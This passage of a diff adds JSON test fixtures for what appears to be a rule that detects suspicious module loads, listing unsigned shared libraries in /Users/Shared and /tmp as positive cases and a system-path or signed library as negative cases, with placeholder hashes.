+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "module_path": "/Users/Shared/lib/libz.1.dylib",
+       "signed": "false",
+       "module_kind": "so",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     },
+     {
+      "attrs": {
+       "module_path": "/tmp/libx.so",
+       "signed": "false",
+       "module_kind": "so",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "module_path": "/usr/lib/libz.so.1",
+       "signed": "false",
+       "module_kind": "so",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     },
+     {
+      "attrs": {
+       "module_path": "/tmp/libx.so",
+       "signed": "true",
+       "module_kind": "so",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     }
+    ]
+   }
+  }
+ ]
+}
